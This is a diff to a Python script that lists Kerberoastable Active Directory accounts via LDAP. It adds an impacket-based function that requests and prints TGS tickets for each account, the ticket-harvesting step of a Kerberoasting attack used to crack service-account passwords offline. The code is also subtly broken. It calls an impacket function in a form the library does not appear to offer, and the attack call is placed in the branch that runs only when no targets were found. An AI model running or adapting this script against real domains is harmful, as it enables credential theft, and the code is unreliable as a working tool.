@@ -1,4 +1,6 @@
 from ldap3 import Server, Connection, SUBTREE
+from impacket.examples import GetUserSPNs
+
 
 def find_kerberoastable_objects(username, password, domain, dc_ip):
     try:
@@ -26,6 +28,22 @@ def find_kerberoastable_objects(username, password, domain, dc_ip):
         print(f"Error while searching for kerberoastable objects: {e}")
         return []
 
+def kerberoast_objects(username, password, domain, dc_ip, kerberoastable_objects):
+    try:
+        # Iterate over kerberoastable objects
+        for obj, spns in kerberoastable_objects:
+            # Kerberoast the object and retrieve TGS tickets
+            print(f"Kerberoasting {obj}...")
+            tgs_tickets = GetUserSPNs.getTGTForUser(username, password, domain, obj, dc_ip)
+
+            # Print TGS tickets
+            if tgs_tickets:
+                for tgs in tgs_tickets:
+                    print(tgs)
+
+    except Exception as e:
+        print(f"Error during Kerberoasting: {e}")
+
 # Example usage:
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
 username = "ajman"
@@ -41,3 +59,5 @@ if kerberoastable_objects:
         print(f"Object: {obj}, SPNs: {', '.join(spns)}")
 else:
     print("No kerberoastable objects found.")
+
+    kerberoast_objects(username, password, domain, dc_ip, kerberoastable_objects)
